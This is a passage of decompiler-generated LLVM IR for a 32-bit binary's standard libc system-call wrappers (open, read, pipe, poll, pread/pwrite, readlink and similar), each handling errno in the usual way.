  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059f20

dec_label_pc_8059f20:                             ; preds = %entry, %dec_label_pc_8059f14
  %v0_8059f20 = phi i32 [ %v4_8059f07, %entry ], [ -1, %dec_label_pc_8059f14 ]
  %v2_8059f22 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059f22, i32* @edx, align 4
  %v2_8059f24 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059f24, i32* @ebx, align 4
  ret i32 %v0_8059f20

; uselistorder directives
  uselistorder i32 %v4_8059f07, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8059f20, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8059f28 = load i32, i32* @ebx, align 4
  store i32 %v0_8059f28, i32* %stack_var_-4, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8059f3b = call i32 @nanosleep(i32 %v0_8059f28, i32 %tmp4)
  store i32 %v2_8059f3b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8059f3b, -4095
  br i1 %tmp, label %dec_label_pc_8059f54, label %dec_label_pc_8059f48

dec_label_pc_8059f48:                             ; preds = %entry
  %v0_8059f48 = load i32, i32* %stack_var_-4, align 4
  %v1_8059f48 = call i32 @__errno_location(i32 %v0_8059f48)
  %v0_8059f4d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059f4d = sub i32 0, %v0_8059f4d
  %v2_8059f4f = inttoptr i32 %v1_8059f48 to i32*
  store i32 %v1_8059f4d, i32* %v2_8059f4f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059f54

dec_label_pc_8059f54:                             ; preds = %entry, %dec_label_pc_8059f48
  %v0_8059f54 = phi i32 [ %v2_8059f3b, %entry ], [ -1, %dec_label_pc_8059f48 ]
  %v2_8059f58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059f58, i32* @ebx, align 4
  ret i32 %v0_8059f54

; uselistorder directives
  uselistorder i32 %v2_8059f3b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059f54, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v0_8059f5c = load i32, i32* @edi, align 4
  %v0_8059f5d = load i32, i32* @ebx, align 4
  %v4_8059f63 = sext i8 %arg2 to i32
  store i32 %v4_8059f63, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_8059f6b = and i8 %arg2, 64
  %v3_8059f6b = icmp eq i8 %v2_8059f6b, 0
  br i1 %v3_8059f6b, label %dec_label_pc_8059f7c, label %dec_label_pc_8059f70

dec_label_pc_8059f70:                             ; preds = %entry
  br label %dec_label_pc_8059f7c

dec_label_pc_8059f7c:                             ; preds = %entry, %dec_label_pc_8059f70
  store i32 %arg1, i32* @ebx, align 4
  %v2_8059f87 = call i32 @open(i32 %v0_8059f5d, i32 %tmp11)
  store i32 %v2_8059f87, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8059f87, -4095
  br i1 %tmp, label %dec_label_pc_8059f9f, label %dec_label_pc_8059f93

dec_label_pc_8059f93:                             ; preds = %dec_label_pc_8059f7c
  %v1_8059f93 = call i32 @__errno_location(i32 %v0_8059f5d)
  %v0_8059f98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059f98 = sub i32 0, %v0_8059f98
  %v2_8059f9a = inttoptr i32 %v1_8059f93 to i32*
  store i32 %v1_8059f98, i32* %v2_8059f9a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059f9f

dec_label_pc_8059f9f:                             ; preds = %dec_label_pc_8059f7c, %dec_label_pc_8059f93
  %v0_8059f9f = phi i32 [ %v2_8059f87, %dec_label_pc_8059f7c ], [ -1, %dec_label_pc_8059f93 ]
  store i32 %v0_8059f5d, i32* @ebx, align 4
  store i32 %v0_8059f5c, i32* @edi, align 4
  ret i32 %v0_8059f9f

; uselistorder directives
  uselistorder i32 %v2_8059f87, { 1, 0, 2 }
  uselistorder i32 %v0_8059f5d, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @open, { 1, 0 }
  uselistorder i8 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8059f9f, { 1, 0 }
  uselistorder label %dec_label_pc_8059f7c, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8059fb7 = call i32 @__libc_open(i32 %arg1, i8 65, i32 %arg2)
  ret i32 %v4_8059fb7
}

define i32 @__GI___libc_open64(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8059fc9 = and i8 %arg2, 64
  %v3_8059fc9 = icmp eq i8 %v2_8059fc9, 0
  br i1 %v3_8059fc9, label %dec_label_pc_8059fda, label %dec_label_pc_8059fce

dec_label_pc_8059fce:                             ; preds = %entry
  br label %dec_label_pc_8059fda

dec_label_pc_8059fda:                             ; preds = %entry, %dec_label_pc_8059fce
  %v0_8059fde = phi i32 [ 0, %entry ], [ %arg3, %dec_label_pc_8059fce ]
  %v4_8059fe4 = call i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %v0_8059fde)
  ret i32 %v4_8059fe4

; uselistorder directives
  uselistorder label %dec_label_pc_8059fda, { 1, 0 }
}

define i32 @__libc_pause() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059ff0 = load i32, i32* @ebx, align 4
  store i32 %v0_8059ff0, i32* %stack_var_-4, align 4
  %v1_8059ff9 = call i32 @pause(i32 %v0_8059ff0)
  store i32 %v1_8059ff9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059ff9, -4095
  br i1 %tmp, label %dec_label_pc_805a010, label %dec_label_pc_805a004

dec_label_pc_805a004:                             ; preds = %entry
  %v0_805a004 = load i32, i32* %stack_var_-4, align 4
  %v1_805a004 = call i32 @__errno_location(i32 %v0_805a004)
  %v0_805a009 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a009 = sub i32 0, %v0_805a009
  %v2_805a00b = inttoptr i32 %v1_805a004 to i32*
  store i32 %v1_805a009, i32* %v2_805a00b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a010

dec_label_pc_805a010:                             ; preds = %entry, %dec_label_pc_805a004
  %v0_805a010 = phi i32 [ %v1_8059ff9, %entry ], [ -1, %dec_label_pc_805a004 ]
  %v2_805a014 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a014, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805a010

; uselistorder directives
  uselistorder i32 %v1_8059ff9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a010, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a018 = load i32, i32* @edi, align 4
  store i32 %v0_805a018, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805a020 = load i32, i32* @ebx, align 4
  %v1_805a028 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_805a028 = call i32 @pipe([2 x i32] %v1_805a028)
  store i32 %v0_805a020, i32* @ebx, align 4
  store i32 %v2_805a028, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805a028, -4095
  br i1 %tmp, label %dec_label_pc_805a040, label %dec_label_pc_805a034

dec_label_pc_805a034:                             ; preds = %entry
  %v1_805a034 = call i32 @__errno_location(i32 %v0_805a020)
  %v0_805a039 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a039 = sub i32 0, %v0_805a039
  %v2_805a03b = inttoptr i32 %v1_805a034 to i32*
  store i32 %v1_805a039, i32* %v2_805a03b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a040

dec_label_pc_805a040:                             ; preds = %entry, %dec_label_pc_805a034
  %v0_805a040 = phi i32 [ %v2_805a028, %entry ], [ -1, %dec_label_pc_805a034 ]
  %v2_805a042 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a042, i32* @edx, align 4
  %v2_805a044 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a044, i32* @edi, align 4
  ret i32 %v0_805a040

; uselistorder directives
  uselistorder i32 %v2_805a028, { 1, 0, 2 }
  uselistorder i32 %v0_805a020, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a040, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a048 = load i32, i32* @edi, align 4
  store i32 %v0_805a048, i32* %stack_var_-4, align 4
  %v4_805a04c = ptrtoint %pollfd* %arg1 to i32
  store i32 %v4_805a04c, i32* %edi.global-to-local, align 4
  %v0_805a058 = load i32, i32* @ebx, align 4
  %v5_805a060 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805a058, i32* @ebx, align 4
  store i32 %v5_805a060, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_805a060, -4095
  br i1 %tmp, label %dec_label_pc_805a078, label %dec_label_pc_805a06c

dec_label_pc_805a06c:                             ; preds = %entry
  %v1_805a06c = call i32 @__errno_location(i32 %v0_805a058)
  %v0_805a071 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a071 = sub i32 0, %v0_805a071
  %v2_805a073 = inttoptr i32 %v1_805a06c to i32*
  store i32 %v1_805a071, i32* %v2_805a073, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a078

dec_label_pc_805a078:                             ; preds = %entry, %dec_label_pc_805a06c
  %v0_805a078 = phi i32 [ %v5_805a060, %entry ], [ -1, %dec_label_pc_805a06c ]
  %v2_805a07a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a07a, i32* @edx, align 4
  %v2_805a07c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a07c, i32* @edi, align 4
  ret i32 %v0_805a078

; uselistorder directives
  uselistorder i32 %v5_805a060, { 1, 0, 2 }
  uselistorder i32 %v0_805a058, { 1, 0 }
  uselistorder label %dec_label_pc_805a078, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_805a080 = load i32, i32* @ebp, align 4
  %v0_805a081 = load i32, i32* @edi, align 4
  %v0_805a082 = load i32, i32* @esi, align 4
  %v0_805a087 = load i32, i32* @edx, align 4
  store i32 %v0_805a087, i32* @ebp, align 4
  %v0_805a089 = load i32, i32* @ecx, align 4
  store i32 %v0_805a089, i32* @ebx, align 4
  %v0_805a08b = load i32, i32* @eax, align 4
  store i32 %v0_805a08b, i32* %stack_var_-60, align 4
  %v4_805a0a9 = call i32 @__libc_lseek64(i32 %v0_805a08b, i32 0, i32 0, i32 1)
  store i32 %v4_805a0a9, i32* @esi, align 4
  %v0_805a0b3 = load i32, i32* @edx, align 4
  store i32 %v0_805a0b3, i32* @edi, align 4
  %v10_805a0b5 = icmp eq i32 %v0_805a0b3, -1
  %v1_805a0b8 = icmp eq i1 %v10_805a0b5, false
  br i1 %v1_805a0b8, label %dec_label_pc_805a0bf, label %dec_label_pc_805a0ba

dec_label_pc_805a0ba:                             ; preds = %entry
  %v10_805a0ba = icmp eq i32 %v4_805a0a9, -1
  br i1 %v10_805a0ba, label %dec_label_pc_805a139, label %dec_label_pc_805a0bf

dec_label_pc_805a0bf:                             ; preds = %dec_label_pc_805a0ba, %entry
  store i32 %v0_805a08b, i32* %stack_var_-60, align 4
  %v4_805a0cd = call i32 @__libc_lseek64(i32 %v0_805a08b, i32 %arg1, i32 %arg2, i32 0)
  %v0_805a0d5 = load i32, i32* @edx, align 4
  %v1_805a0d5 = add i32 %v0_805a0d5, 1
  %v8_805a0d5 = icmp eq i32 %v1_805a0d5, 0
  %v1_805a0d6 = icmp eq i1 %v8_805a0d5, false
  br i1 %v1_805a0d6, label %dec_label_pc_805a0db, label %dec_label_pc_805a0d8

dec_label_pc_805a0d8:                             ; preds = %dec_label_pc_805a0bf
  %v1_805a0d8 = add i32 %v4_805a0cd, 1
  %v8_805a0d8 = icmp eq i32 %v1_805a0d8, 0
  br i1 %v8_805a0d8, label %dec_label_pc_805a139, label %dec_label_pc_805a0db

dec_label_pc_805a0db:                             ; preds = %dec_label_pc_805a0d8, %dec_label_pc_805a0bf
  %v0_805a0f0 = phi i32 [ %v1_805a0d8, %dec_label_pc_805a0d8 ], [ %v4_805a0cd, %dec_label_pc_805a0bf ]
  %v12_805a0db = icmp eq i32 %arg3, 1
  %v1_805a0e0 = icmp eq i1 %v12_805a0db, false
  %v0_805a0f1 = load i32, i32* @ebx, align 4
  store i32 %v0_805a08b, i32* %stack_var_-60, align 4
  br i1 %v1_805a0e0, label %dec_label_pc_805a0f0, label %dec_label_pc_805a0e2

dec_label_pc_805a0e2:                             ; preds = %dec_label_pc_805a0db
  %v3_805a0e9 = call i32 @__libc_write(i32 %v0_805a08b, i32 %v0_805a0f1, i32 %v1_805a0d5)
  br label %dec_label_pc_805a0fc

dec_label_pc_805a0f0:                             ; preds = %dec_label_pc_805a0db
  %v3_805a0f7 = call i32 @__libc_read(i32 %v0_805a08b, i32 %v0_805a0f1, i32 %v0_805a0f0)
  br label %dec_label_pc_805a0fc

dec_label_pc_805a0fc:                             ; preds = %dec_label_pc_805a0e2, %dec_label_pc_805a0f0
  %storemerge = phi i32 [ %v3_805a0f7, %dec_label_pc_805a0f0 ], [ %v3_805a0e9, %dec_label_pc_805a0e2 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_805a101 = load i32, i32* %stack_var_-60, align 4
  %v1_805a101 = call i32 @__errno_location(i32 %v0_805a101)
  store i32 %v1_805a101, i32* @ebx, align 4
  %v1_805a108 = inttoptr i32 %v1_805a101 to i32*
  %v2_805a108 = load i32, i32* %v1_805a108, align 4
  %v0_805a110 = load i32, i32* @edi, align 4
  %v0_805a111 = load i32, i32* @esi, align 4
  store i32 %v0_805a08b, i32* %stack_var_-60, align 4
  %v4_805a116 = call i32 @__libc_lseek64(i32 %v0_805a08b, i32 %v0_805a111, i32 %v0_805a110, i32 0)
  %v0_805a11e = load i32, i32* @edx, align 4
  %v8_805a11e = icmp eq i32 %v0_805a11e, -1
  %v1_805a11f = icmp eq i1 %v8_805a11e, false
  br i1 %v1_805a11f, label %dec_label_pc_805a131, label %dec_label_pc_805a121

dec_label_pc_805a121:                             ; preds = %dec_label_pc_805a0fc
  %v8_805a121 = icmp eq i32 %v4_805a116, -1
  %v1_805a122 = icmp eq i1 %v8_805a121, false
  br i1 %v1_805a122, label %dec_label_pc_805a131, label %dec_label_pc_805a124

dec_label_pc_805a124:                             ; preds = %dec_label_pc_805a121
  %v0_805a124 = load i32, i32* %ebp.global-to-local, align 4
  %v10_805a124 = icmp eq i32 %v0_805a124, -1
  %v1_805a127 = icmp eq i1 %v10_805a124, false
  br i1 %v1_805a127, label %dec_label_pc_805a139, label %dec_label_pc_805a129

dec_label_pc_805a129:                             ; preds = %dec_label_pc_805a124
  %v1_805a12d = load i32, i32* @ebx, align 4
  %v2_805a12d = inttoptr i32 %v1_805a12d to i32*
  store i32 %v2_805a108, i32* %v2_805a12d, align 4
  br label %dec_label_pc_805a13c

dec_label_pc_805a131:                             ; preds = %dec_label_pc_805a121, %dec_label_pc_805a0fc
  %v1_805a135 = load i32, i32* @ebx, align 4
  %v2_805a135 = inttoptr i32 %v1_805a135 to i32*
  store i32 %v2_805a108, i32* %v2_805a135, align 4
  br label %dec_label_pc_805a13c

dec_label_pc_805a139:                             ; preds = %dec_label_pc_805a124, %dec_label_pc_805a0d8, %dec_label_pc_805a0ba
  store i32 -1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805a13c

dec_label_pc_805a13c:                             ; preds = %dec_label_pc_805a131, %dec_label_pc_805a129, %dec_label_pc_805a139
  %v0_805a13f = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805a082, i32* @esi, align 4
  store i32 %v0_805a081, i32* @edi, align 4
  store i32 %v0_805a080, i32* @ebp, align 4
  ret i32 %v0_805a13f

; uselistorder directives
  uselistorder i32 %v2_805a108, { 1, 0 }
  uselistorder i32 %v0_805a0f1, { 1, 0 }
  uselistorder i32 %v0_805a08b, { 2, 1, 4, 0, 3, 6, 5, 8, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805a13c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a0fc, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805a146 = load i32, i32* @esi, align 4
  %v0_805a147 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_805a16e = call i32 @__fake_pread_write64(i32 %v0_805a147, i32 %v0_805a146, i32 %arg4, i32 %arg5, i32 1)
  ret i32 %v5_805a16e
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805a173 = load i32, i32* @esi, align 4
  %v0_805a174 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_805a19b = call i32 @__fake_pread_write64(i32 %v0_805a174, i32 %v0_805a173, i32 %arg4, i32 %arg5, i32 0)
  ret i32 %v5_805a19b

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v0_805a1a0 = load i32, i32* @ebp, align 4
  %v0_805a1a1 = load i32, i32* @edi, align 4
  %v0_805a1a2 = load i32, i32* @esi, align 4
  %v0_805a1a7 = load i32, i32* @eax, align 4
  store i32 %v0_805a1a7, i32* @edi, align 4
  %v0_805a1a9 = load i32, i32* @edx, align 4
  store i32 %v0_805a1a9, i32* @esi, align 4
  %v0_805a1ab = load i32, i32* @ecx, align 4
  store i32 %v0_805a1ab, i32* @ebx, align 4
  store i32 %v0_805a1a7, i32* %stack_var_-44, align 4
  %v3_805a1b2 = call i32 @__GI___libc_lseek(i32 %v0_805a1a7, i32 0, i32 1)
  %v13_805a1be = icmp eq i32 %v3_805a1b2, -1
  br i1 %v13_805a1be, label %dec_label_pc_805a21d, label %dec_label_pc_805a1c5

dec_label_pc_805a1c5:                             ; preds = %entry
  %v0_805a1cc = load i32, i32* @edi, align 4
  store i32 %v0_805a1cc, i32* %stack_var_-44, align 4
  %v3_805a1cd = call i32 @__GI___libc_lseek(i32 %v0_805a1cc, i32 %arg1, i32 0)
  %v8_805a1d5 = icmp eq i32 %v3_805a1cd, -1
  br i1 %v8_805a1d5, label %dec_label_pc_805a21d, label %dec_label_pc_805a1d8

dec_label_pc_805a1d8:                             ; preds = %dec_label_pc_805a1c5
  %v12_805a1d8 = icmp eq i32 %arg2, 1
  %v1_805a1dd = icmp eq i1 %v12_805a1d8, false
  %v0_805a1eb = load i32, i32* @ebx, align 4
  %v0_805a1ec = load i32, i32* @esi, align 4
  %v0_805a1ed = load i32, i32* @edi, align 4
  store i32 %v0_805a1ed, i32* %stack_var_-44, align 4
  br i1 %v1_805a1dd, label %dec_label_pc_805a1ea, label %dec_label_pc_805a1df

dec_label_pc_805a1df:                             ; preds = %dec_label_pc_805a1d8
  %v3_805a1e3 = call i32 @__libc_write(i32 %v0_805a1ed, i32 %v0_805a1ec, i32 %v0_805a1eb)
  br label %dec_label_pc_805a1f3

dec_label_pc_805a1ea:                             ; preds = %dec_label_pc_805a1d8
  %v3_805a1ee = call i32 @__libc_read(i32 %v0_805a1ed, i32 %v0_805a1ec, i32 %v0_805a1eb)
  br label %dec_label_pc_805a1f3

dec_label_pc_805a1f3:                             ; preds = %dec_label_pc_805a1df, %dec_label_pc_805a1ea
  %storemerge = phi i32 [ %v3_805a1ee, %dec_label_pc_805a1ea ], [ %v3_805a1e3, %dec_label_pc_805a1df ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_805a1f8 = load i32, i32* %stack_var_-44, align 4
  %v1_805a1f8 = call i32 @__errno_location(i32 %v0_805a1f8)
  store i32 %v1_805a1f8, i32* @ebx, align 4
  %v1_805a1ff = inttoptr i32 %v1_805a1f8 to i32*
  %v2_805a1ff = load i32, i32* %v1_805a1ff, align 4
  store i32 %v2_805a1ff, i32* @ebp, align 4
  %v0_805a208 = load i32, i32* @edi, align 4
  store i32 %v0_805a208, i32* %stack_var_-44, align 4
  %v3_805a209 = call i32 @__GI___libc_lseek(i32 %v0_805a208, i32 %v3_805a1b2, i32 0)
  %v8_805a211 = icmp eq i32 %v3_805a209, -1
  %v1_805a212 = icmp eq i1 %v8_805a211, false
  br i1 %v1_805a212, label %dec_label_pc_805a219, label %dec_label_pc_805a214

dec_label_pc_805a214:                             ; preds = %dec_label_pc_805a1f3
  %v0_805a214 = load i32, i32* @esi, align 4
  %v10_805a214 = icmp eq i32 %v0_805a214, -1
  %v1_805a217 = icmp eq i1 %v10_805a214, false
  br i1 %v1_805a217, label %dec_label_pc_805a21d, label %dec_label_pc_805a219

dec_label_pc_805a219:                             ; preds = %dec_label_pc_805a214, %dec_label_pc_805a1f3
  %v0_805a219 = load i32, i32* @ebp, align 4
  %v1_805a219 = load i32, i32* @ebx, align 4
  %v2_805a219 = inttoptr i32 %v1_805a219 to i32*
  store i32 %v0_805a219, i32* %v2_805a219, align 4
  %v0_805a223.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a220

dec_label_pc_805a21d:                             ; preds = %dec_label_pc_805a214, %dec_label_pc_805a1c5, %entry
  br label %dec_label_pc_805a220

dec_label_pc_805a220:                             ; preds = %dec_label_pc_805a219, %dec_label_pc_805a21d
  %v0_805a223 = phi i32 [ %v0_805a223.pre, %dec_label_pc_805a219 ], [ -1, %dec_label_pc_805a21d ]
  store i32 %v0_805a1a2, i32* @esi, align 4
  store i32 %v0_805a1a1, i32* @edi, align 4
  store i32 %v0_805a1a0, i32* @ebp, align 4
  ret i32 %v0_805a223

; uselistorder directives
  uselistorder i32 %v0_805a1ed, { 1, 0, 2 }
  uselistorder i32 %v0_805a1ec, { 1, 0 }
  uselistorder i32 %v0_805a1eb, { 1, 0 }
  uselistorder i32 %v3_805a1b2, { 1, 0 }
  uselistorder i32 %v0_805a1a7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805a220, { 1, 0 }
  uselistorder label %dec_label_pc_805a1f3, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805a22a = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_805a248 = call i32 @__fake_pread_write(i32 %v0_805a22a, i32 %arg4, i32 1)
  ret i32 %v3_805a248
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805a24d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_805a26b = call i32 @__fake_pread_write(i32 %v0_805a24d, i32 %arg4, i32 0)
  ret i32 %v3_805a26b

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805a270 = load i32, i32* @edi, align 4
  store i32 %v0_805a270, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805a280 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805a288 = call i32 @read(i32 %v0_805a280, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805a280, i32* @ebx, align 4
  store i32 %v3_805a288, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805a288, -4095
  br i1 %tmp, label %dec_label_pc_805a2a0, label %dec_label_pc_805a294

dec_label_pc_805a294:                             ; preds = %entry
  %v1_805a294 = call i32 @__errno_location(i32 %v0_805a280)
  %v0_805a299 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a299 = sub i32 0, %v0_805a299
  %v2_805a29b = inttoptr i32 %v1_805a294 to i32*
  store i32 %v1_805a299, i32* %v2_805a29b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a2a0

dec_label_pc_805a2a0:                             ; preds = %entry, %dec_label_pc_805a294
  %v0_805a2a0 = phi i32 [ %v3_805a288, %entry ], [ -1, %dec_label_pc_805a294 ]
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805a2a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a2a4, i32* @edi, align 4
  ret i32 %v0_805a2a0

; uselistorder directives
  uselistorder i32 %v3_805a288, { 1, 0, 2 }
  uselistorder i32 %v0_805a280, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @read, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805a2a0, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805a2a8 = load i32, i32* @edi, align 4
  store i32 %v0_805a2a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a2b8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805a2c0 = call i32 @readlink(i32 %v0_805a2b8, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805a2b8, i32* @ebx, align 4
  store i32 %v3_805a2c0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805a2c0, -4095
  br i1 %tmp, label %dec_label_pc_805a2d8, label %dec_label_pc_805a2cc

dec_label_pc_805a2cc:                             ; preds = %entry
  %v1_805a2cc = call i32 @__errno_location(i32 %v0_805a2b8)
  %v0_805a2d1 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a2d1 = sub i32 0, %v0_805a2d1
  %v2_805a2d3 = inttoptr i32 %v1_805a2cc to i32*
  store i32 %v1_805a2d1, i32* %v2_805a2d3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a2d8

dec_label_pc_805a2d8:                             ; preds = %entry, %dec_label_pc_805a2cc
  %v0_805a2d8 = phi i32 [ %v3_805a2c0, %entry ], [ -1, %dec_label_pc_805a2cc ]
  %v2_805a2dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a2dc, i32* @edi, align 4
  ret i32 %v0_805a2d8

; uselistorder directives
  uselistorder i32 %v3_805a2c0, { 1, 0, 2 }
  uselistorder i32 %v0_805a2b8, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 1, 0 }
  uselistorder label %dec_label_pc_805a2d8, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a2e0 = load i32, i32* @edi, align 4
  store i32 %v0_805a2e0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a2e8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a2f0 = call i32 @sched_get_priority_max(i32 %v0_805a2e8)
  store i32 %v0_805a2e8, i32* @ebx, align 4
  store i32 %v1_805a2f0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a2f0, -4095
